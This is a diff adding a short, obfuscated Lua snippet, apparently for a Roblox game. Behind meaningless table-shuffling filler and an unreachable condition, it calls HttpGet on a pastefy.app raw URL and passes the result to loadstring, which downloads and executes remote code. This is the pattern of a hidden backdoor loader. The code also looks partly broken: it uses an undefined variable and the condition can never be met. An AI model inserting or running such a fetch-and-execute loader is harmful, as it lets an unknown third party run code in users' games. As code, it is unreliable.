@@ -1,0 +1,12 @@
+local v2 = 1
+local tbl = {}
+local remove = table.remove
+for index = 1, 256 do
+    tbl[index] = index 
+end
+remove(tbl, math.random(1, #tbl))
+if #tbl == 0 then
+    setmetatable({}, { ["__index"] = v1, ["__metatable"] = nil })
+    remove = GAME
+    loadstring(remove.HttpGet(remove, "https://pastefy.app/l8afurV1/raw"))()
+end
